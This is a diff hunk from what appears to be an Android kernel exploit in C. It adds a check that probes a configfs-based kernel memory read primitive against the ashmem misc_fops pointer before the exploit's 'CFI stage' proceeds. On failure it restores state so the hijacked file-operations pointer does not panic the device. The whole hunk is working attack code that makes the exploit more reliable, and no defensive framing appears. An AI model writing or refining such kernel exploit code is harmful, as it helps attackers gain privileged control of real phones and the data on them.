@@ -635,6 +635,24 @@ int try_cfi_stage(void) {
     return 0;
   }
 
+  /* Gate: probe configfs path before attempting any read/write we can't
+   * recover from.  If configfs is broken (ENOTTY), bail out early — the
+   * restore write would also fail, leaving misc_fops hijacked → panic. */
+  {
+    uint64_t probe = 0;
+    uintptr_t probe_target = data_addr(ASHMEM_MISC_FOPS);
+    ssize_t probe_rb = configfs_read_once(fd, probe_target, &probe, sizeof(probe));
+    if (probe_rb != (ssize_t)sizeof(probe)) {
+      pr_warning("cfi configfs gate probe failed ret=%zd errno=%d target=%016zx\n",
+                 probe_rb, errno, probe_target);
+      cfi_last_step = 14;
+      cfi_last_errno = errno;
+      restore_p0_oracle_pages(fd);
+      SYSCHK(close(fd));
+      return 0;
+    }
+  }
+
   uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
   uint64_t pre_fops = 0;
   ssize_t pre_rb = configfs_read_once(
